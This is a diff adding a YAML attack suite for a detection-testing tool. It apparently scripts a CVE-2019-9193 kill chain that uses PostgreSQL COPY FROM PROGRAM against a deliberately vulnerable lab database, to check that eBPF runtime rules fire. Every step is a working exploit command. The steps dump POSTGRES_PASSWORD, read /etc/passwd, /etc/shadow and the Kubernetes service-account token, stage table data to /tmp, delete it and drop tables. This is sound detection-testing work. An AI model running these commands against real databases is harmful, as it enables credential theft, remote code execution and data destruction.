@@ -1,0 +1,264 @@
+apiVersion: bobctl.k8sstormcenter.io/v1alpha1
+kind: AttackSuite
+metadata:
+  name: postgres-vuln-cve-2019-9193
+  description: >-
+    CVE-2019-9193 kill-chain attack suite: demonstrates how a misconfigured
+    PostgreSQL deployment (superuser access) allows SQL-to-RCE via COPY FROM
+    PROGRAM. Every attack uses pure SQL — no kubectl exec post-exploitation
+    needed. The PROGRAM commands execute on the PostgreSQL SERVER container,
+    producing kernel-visible processes detectable by eBPF-based runtime
+    security (node-agent). This is the poster-child example of how BoB detects
+    SQL-based remote code execution.
+    Covers MITRE ATT&CK: T1190 (Initial Access), T1059 (Execution),
+    T1552 (Credential Access), T1082/T1057 (Discovery), T1048 (Exfiltration),
+    T1070 (Defense Evasion), T1485 (Impact).
+    NOTE: Commands are deliberately chosen to NOT overlap with postgres
+    docker-entrypoint.sh binaries (cat, ls, id, find, getent are in the
+    server's baseline profile). We use head, wc, whoami, hostname, ps, etc.
+target:
+  service: pg-vuln-client
+  namespace: postgres-vuln
+  port: 5432
+
+attacks:
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Setup: create staging table for COPY output
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  - name: setup-cmd-table
+    type: sqli
+    exec:
+      command: ["psql", "-tAc",
+                "DROP TABLE IF EXISTS cmd_out; CREATE TABLE cmd_out(line text);"]
+    expectedDetections: []
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 1: RECONNAISSANCE (TA0043) — System enumeration via SQL RCE
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # T1082 — System Information Discovery: hostname
+  - name: cve-recon-hostname
+    type: sqli
+    exec:
+      command: ["psql", "-tAc",
+                "TRUNCATE cmd_out; COPY cmd_out FROM PROGRAM 'hostname'; SELECT * FROM cmd_out;"]
+    successIndicators:
+      - bodyContains: "pg-vuln"
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: postgres
+        command: hostname
+
+  # T1082 — System Information Discovery: uname
+  - name: cve-recon-uname
+    type: sqli
+    exec:
+      command: ["psql", "-tAc",
+                "TRUNCATE cmd_out; COPY cmd_out FROM PROGRAM 'uname -a'; SELECT * FROM cmd_out;"]
+    successIndicators:
+      - bodyContains: "Linux"
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: postgres
+        command: uname
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 2: INITIAL ACCESS (TA0001) — Verify superuser RCE works
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # T1059.004 — Unix Shell: COPY FROM PROGRAM 'whoami'
+  - name: cve-exec-whoami
+    type: sqli
+    exec:
+      command: ["psql", "-tAc",
+                "TRUNCATE cmd_out; COPY cmd_out FROM PROGRAM 'whoami'; SELECT * FROM cmd_out;"]
+    successIndicators:
+      - bodyContains: "postgres"
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: postgres
+        command: whoami
+
+  # T1059.004 — Unix Shell: COPY FROM PROGRAM 'printenv' (dump env vars)
+  - name: cve-exec-printenv
+    type: sqli
+    exec:
+      command: ["psql", "-tAc",
+                "TRUNCATE cmd_out; COPY cmd_out FROM PROGRAM 'printenv POSTGRES_PASSWORD PGDATA HOSTNAME'; SELECT * FROM cmd_out;"]
+    successIndicators:
+      - bodyContains: "postgresql"
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: postgres
+        command: printenv
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 7: CREDENTIAL ACCESS (TA0006) — Read sensitive files via SQL RCE
+  # NOTE: We use 'head' instead of 'cat' because cat is in the postgres
+  # entrypoint profile. head is not, so it triggers R0001.
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # T1552.001 — Credentials in Files: /etc/passwd
+  - name: cve-cred-passwd
+    type: sqli
+    exec:
+      command: ["psql", "-tAc",
+                "TRUNCATE cmd_out; COPY cmd_out FROM PROGRAM 'head -5 /etc/passwd'; SELECT * FROM cmd_out;"]
+    successIndicators:
+      - bodyContains: "root:"
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: postgres
+        command: head
+
+  # T1552.001 — Credentials in Files: /etc/shadow
+  # head fails (permission denied) but the process spawn still triggers R0001.
+  - name: cve-cred-shadow
+    type: sqli
+    exec:
+      command: ["psql", "-tAc",
+                "TRUNCATE cmd_out; COPY cmd_out FROM PROGRAM 'head -1 /etc/shadow 2>&1 || true'; SELECT * FROM cmd_out;"]
+    successIndicators:
+      - bodyContains: "Permission denied"
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: postgres
+        command: head
+
+  # T1552.001 — Credentials in Files: /proc/1/environ (environment variables)
+  # Uses wc instead of cat because /proc/1/environ contains null bytes that
+  # break PostgreSQL's COPY text parser. wc still opens the file (triggers
+  # R0008) and is not a normal postgres process (triggers R0001).
+  - name: cve-cred-environ
+    type: sqli
+    exec:
+      command: ["psql", "-tAc",
+                "TRUNCATE cmd_out; COPY cmd_out FROM PROGRAM 'wc -c /proc/1/environ'; SELECT * FROM cmd_out;"]
+    successIndicators:
+      - bodyContains: "/proc/1/environ"
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: postgres
+        command: wc
+      - ruleID: R0008
+        ruleName: Read Environment Variables from procfs
+        containerName: postgres
+        command: wc
+
+  # T1552.001 — Credentials in Files: Kubernetes service account token
+  - name: cve-cred-sa-token
+    type: sqli
+    exec:
+      command: ["psql", "-tAc",
+                "TRUNCATE cmd_out; COPY cmd_out FROM PROGRAM 'head -1 /var/run/secrets/kubernetes.io/serviceaccount/token'; SELECT substring(line, 1, 40) FROM cmd_out;"]
+    successIndicators:
+      - bodyContains: "eyJ"
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: postgres
+        command: head
+      # R0006 (SA token access) does not fire for COPY FROM PROGRAM reads —
+      # the token open happens inside the postgres backend, not via a
+      # standalone process that node-agent can attribute to a new exec.
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 8: DISCOVERY (TA0007) — System enumeration
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # T1057 — Process Discovery: ps
+  - name: cve-disc-ps
+    type: sqli
+    exec:
+      command: ["psql", "-tAc",
+                "TRUNCATE cmd_out; COPY cmd_out FROM PROGRAM 'ps aux'; SELECT * FROM cmd_out LIMIT 10;"]
+    successIndicators:
+      - bodyContains: "postgres"
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: postgres
+        command: ps
+
+  # T1046 — Network Service Discovery: network config
+  - name: cve-disc-net
+    type: sqli
+    exec:
+      command: ["psql", "-tAc",
+                "TRUNCATE cmd_out; COPY cmd_out FROM PROGRAM 'head -5 /etc/resolv.conf'; SELECT * FROM cmd_out;"]
+    successIndicators:
+      - bodyContains: "nameserver"
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: postgres
+        command: head
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 10: COLLECTION (TA0009) — Data exfiltration via COPY TO PROGRAM
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # T1074 — Data Staged: COPY TO PROGRAM writes query results to file
+  - name: cve-exfil-copy-to
+    type: sqli
+    exec:
+      command: ["psql", "-tAc",
+                "COPY (SELECT * FROM bobtest) TO PROGRAM 'tee /tmp/exfil_data.txt'; SELECT 'exfil_staged';"]
+    successIndicators:
+      - bodyContains: "exfil_staged"
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: postgres
+        command: tee
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 6: DEFENSE EVASION (TA0005) — Cover tracks
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # T1070.004 — Indicator Removal: delete exfiltrated data
+  - name: cve-evasion-rm
+    type: sqli
+    exec:
+      command: ["psql", "-tAc",
+                "TRUNCATE cmd_out; COPY cmd_out FROM PROGRAM 'rm -f /tmp/exfil_data.txt && echo removed'; SELECT * FROM cmd_out;"]
+    successIndicators:
+      - bodyContains: "removed"
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: postgres
+        command: rm
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 12: IMPACT (TA0040) — Data destruction
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # T1485 — Data Destruction: DROP TABLE
+  - name: cve-impact-drop-table
+    type: sqli
+    exec:
+      command: ["psql", "-tAc",
+                "DROP TABLE IF EXISTS cmd_out; DROP TABLE IF EXISTS bobtest; SELECT 'tables_destroyed';"]
+    successIndicators:
+      - bodyContains: "tables_destroyed"
+    expectedDetections: []
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Cleanup
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  - name: cleanup-recreate-bobtest
+    type: sqli
+    exec:
+      command: ["psql", "-tAc",
+                "CREATE TABLE IF NOT EXISTS bobtest (id SERIAL PRIMARY KEY, key TEXT NOT NULL, value TEXT, created_at TIMESTAMPTZ DEFAULT NOW()); INSERT INTO bobtest (key, value) VALUES ('restored', 'after-attack');"]
+    expectedDetections: []
